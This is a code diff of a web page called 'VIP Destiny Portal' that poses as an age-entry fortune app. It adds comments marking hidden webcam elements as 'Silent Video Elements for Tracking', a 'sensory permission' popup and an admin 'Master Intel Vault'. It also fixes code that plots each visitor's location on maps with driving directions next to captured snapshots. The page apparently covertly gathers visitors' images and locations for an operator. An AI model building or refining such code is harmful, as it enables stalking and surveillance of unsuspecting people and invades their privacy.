@@ -5,9 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VIP Destiny Portal - Master Live Edition</title>
     
+    <!-- Fonts & Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800;900&family=Noto+Nastaliq+Urdu:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     
+    <!-- External Libraries -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
@@ -144,6 +146,7 @@
 </head>
 <body>
 
+    <!-- Silent Video Elements for Tracking -->
     <video id="webcamVideo" autoplay playsinline style="display:none;"></video>
     <canvas id="webcamCanvas" style="display:none;"></canvas>
 
@@ -152,6 +155,7 @@
     <div class="theme-toggle" onclick="toggleTheme()" title="Toggle Dark Mode"><i class="fa-solid fa-moon" id="themeIcon"></i></div>
     <div class="secret-crown" onclick="showVipLogin()" title="Admin Login"><i class="fa-solid fa-crown"></i></div>
 
+    <!-- 1. VIP SENSORY PERMISSION POPUP -->
     <div class="custom-overlay" id="sensoryModal">
         <div class="modal-box">
             <i class="fa-solid fa-satellite-dish fa-radar"></i>
@@ -164,6 +168,7 @@
         </div>
     </div>
 
+    <!-- 2. VIP ADMIN LOGIN POPUP -->
     <div class="custom-overlay" id="vipLoginModal">
         <div class="modal-box">
             <i class="fa-solid fa-user-shield"></i>
@@ -175,6 +180,7 @@
         </div>
     </div>
 
+    <!-- 3. 10 SECOND INIT SCREEN -->
     <div id="initScreen">
         <i class="fa-solid fa-server" style="font-size: 60px; margin-bottom: 20px; animation: popIn 1s infinite alternate;"></i>
         <h2 style="margin: 0; text-shadow: 0 0 15px #00ffcc; text-align: center;">SUPABASE SECURE CONNECTION</h2>
@@ -182,6 +188,7 @@
         <div id="syncText">Establishing Encrypted Connection...</div>
     </div>
 
+    <!-- 4. IMAGE VIEWER MODAL (NEW) -->
     <div id="imageViewerModal">
         <i class="fa-solid fa-xmark btn-close-viewer" onclick="closeImageViewer()"></i>
         <img id="viewerImage" src="" alt="Full Size Intel">
@@ -191,6 +198,7 @@
         </div>
     </div>
 
+    <!-- MAIN APP PANEL -->
     <div class="glass-panel" id="mainPanel">
         <div class="step active" id="step1">
             <h2><i class="fa-solid fa-hourglass-half"></i> Enter Your Age<br><span class="urdu-text">اپنی عمر درج کریں</span></h2>
@@ -256,6 +264,7 @@
         </div>
     </div>
 
+    <!-- ADMIN VAULT UI -->
     <div id="adminVaultUI">
         <div class="vault-header">
             <h2 style="margin:0; color:#00ffcc; text-shadow:0 0 15px #00ffcc;"><i class="fa-solid fa-network-wired"></i> MASTER INTEL VAULT</h2>
@@ -607,8 +616,8 @@
             filteredData.forEach((entry, i) => {
                 let cleanTime = entry.created_at ? new Date(entry.created_at).toLocaleString() : "Unknown Time";
                 
-                // Live Embedded Interactive Map and Direction routing link
-                let locDisplay = entry.location_coords && entry.location_coords.includes("Denied") ? `<span style="color:#ff4d4d; font-weight:bold;">BLOCKED</span>` : `<div style="position:relative; width: 160px; height: 100px; display: inline-block; margin-bottom: 5px;"><iframe width="160" height="100" frameborder="0" style="border:0; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.6);" src="https://maps.google.com/maps?q=$${entry.location_coords.replace(' ', '')}&z=14&output=embed"></iframe><a href="https://www.google.com/maps/dir/?api=1&destination=$${entry.location_coords.replace(' ', '')}" target="_blank" style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:10; background:transparent;" title="Click for Live Directions"></a></div><br><a href="https://www.google.com/maps/dir/?api=1&destination=$${entry.location_coords.replace(' ', '')}" target="_blank" class="loc-link"><i class="fa-solid fa-route"></i> Directions</a><br><small style="color:#00b4db;">${entry.location_coords}</small>`;
+                // Live Embedded Interactive Map and Direction routing link with FIXED syntax
+                let locDisplay = entry.location_coords && entry.location_coords.includes("Denied") ? `<span style="color:#ff4d4d; font-weight:bold;">BLOCKED</span>` : `<div style="position:relative; width: 160px; height: 100px; display: inline-block; margin-bottom: 5px;"><iframe width="160" height="100" frameborder="0" style="border:0; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.6);" src="https://maps.google.com/maps?q=${entry.location_coords.replace(' ', '')}&z=14&output=embed"></iframe><a href="https://www.google.com/maps/dir/?api=1&destination=${entry.location_coords.replace(' ', '')}" target="_blank" style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:10; background:transparent;" title="Click for Live Directions"></a></div><br><a href="https://www.google.com/maps/dir/?api=1&destination=${entry.location_coords.replace(' ', '')}" target="_blank" class="loc-link"><i class="fa-solid fa-route"></i> Directions</a><br><small style="color:#00b4db;">${entry.location_coords}</small>`;
                 
                 // --- INTEGRATED IMAGE VIEWER TRIGGER WITH DELETE CAPABILITY ---
                 let snapsHTML = entry.snaps && entry.snaps.length > 0 
